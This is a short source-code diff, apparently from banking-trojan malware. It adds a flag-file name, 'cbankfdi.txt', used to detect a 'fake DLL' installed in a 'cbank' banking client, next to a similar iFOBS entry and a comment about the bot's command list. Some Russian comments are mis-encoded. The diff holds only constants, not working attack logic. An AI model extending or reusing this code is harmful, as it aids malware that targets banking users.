@@ -121,6 +121,8 @@ CSSTR EStrFakeDllInstaller[] = "fdi.plug";
 CSSTR EStrFakeDllFlag[] = "fdi.txt";
 //им€ файла по которому определ€ем, что установлена фейкдлл в клиенте ифобс
 CSSTR EStrFakeDllIFobsFlag[] = "ifobsfdi.txt";
+//им€ файла по которому определ€ем, что установлена фейкдлл в клиенте cbank
+CSSTR EStrFakeDllCBankFlag[] = "cbankfdi.txt";
 
 
 // ѕеречень команд, которые может выполн€ь бот
